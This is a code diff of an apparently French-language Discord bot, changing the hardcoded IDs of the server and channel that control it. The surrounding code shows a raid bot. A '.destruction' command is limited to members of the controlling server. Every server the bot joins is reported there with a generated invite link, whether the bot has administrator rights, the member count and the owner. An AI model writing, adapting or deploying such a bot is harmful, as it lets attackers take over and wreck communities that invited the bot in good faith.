@@ -27,13 +27,13 @@ if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
 
 bot.on('message', msg => {
 
-  if (msg.guild === bot.guilds.find('id', '451334633137897472')){ 
+  if (msg.guild === bot.guilds.find('id', '453631449804046336')){ 
     return;
   }
   
   
 
- if (bot.guilds.get('451334633137897472').members.get(msg.author.id) !== undefined) {
+ if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
 if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
@@ -219,7 +219,7 @@ bot.on("message", message => {
     message.channel.send(userinfo_embed).catch(e => {});
   }})
   bot.on("message", message => {
-  if (bot.guilds.get('451334633137897472').members.get(message.author.id) !== undefined) {
+  if (bot.guilds.get('453631449804046336').members.get(message.author.id) !== undefined) {
     if(message.content.startsWith(".listeserver")) {
       bot.guilds.forEach(guild => {
         var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id)
@@ -356,18 +356,18 @@ bot.on("message", message => {
         if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
           var invite = guild.channels.find("id", guild.channels.random().id);
           invite.createInvite().then(invite => {
-            bot.guilds.get('451334633137897472').channels.get('452910447985688584').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
+            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
           })
         }
         else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")){
           var invite = guild.channels.find("id", guild.channels.random().id);
           invite.createInvite().then(invite => {
-            bot.guilds.get('451334633137897472').channels.get('452910447985688584').send(`[NO ADMIN] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
+            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[NO ADMIN] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
           })
         }
       });
       bot.on('guildDelete', guild => {
-        bot.guilds.get('451334633137897472').channels.get('452910447985688584').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
+        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
       })
 
 bot.login(process.env.BOT_TOKEN); 
